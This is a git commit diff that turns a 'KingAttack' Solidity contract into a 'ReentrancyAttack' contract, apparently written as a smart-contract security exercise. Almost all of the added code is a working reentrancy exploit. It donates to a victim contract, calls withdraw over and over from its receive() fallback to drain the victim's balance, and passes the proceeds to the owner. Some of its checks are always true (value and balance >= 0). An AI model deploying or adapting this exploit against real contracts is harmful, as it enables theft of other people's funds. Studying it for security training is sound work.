ba4c4a3c8d3ea478aaae5c50c7aacfc48a69c9cd
Aitor Zaldua <aitor.zaldua@draftdigital.org>
2022-11-04 19:56:59 +0100

    reentrancy 2

--- contracts/KingAttack.sol
+++ contracts/KingAttack.sol
@@ -1,12 +1,40 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
+import "./ReentrancyContract.sol";
+
 import "hardhat/console.sol";
 
-contract KingAttack {
+contract ReentrancyAttack {
   
-    constructor (address payable _victimContractAddr) payable {
-          address(_victimContractAddr).call{value: msg.value}("");
+    ReentrancyContract public victimContract;
+
+    uint donationValue;
+    address owner;
+
+    constructor (address payable _victimContractAddr) {
+        owner = msg.sender;
+        victimContract = ReentrancyContract(_victimContractAddr);
     }
+
+    function attack () external payable  {
+        require(msg.value >= 0, "Please, donate something");
+        donationValue = msg.value;
+        victimContract.donate{value: msg.value}(address(this));
+        victimContract.withdraw(donationValue);
+    }
+
+    receive() external payable {
+        if (address(victimContract).balance >= 0) {
+            victimContract.withdraw(donationValue);
+        }
+    }
+
+    function withdraw() external {
+        uint256 balance = address(this).balance;
+        (bool success, ) = owner.call{value: balance}("");
+        require(success, "withdraw failed");
+    }
+
 
 }
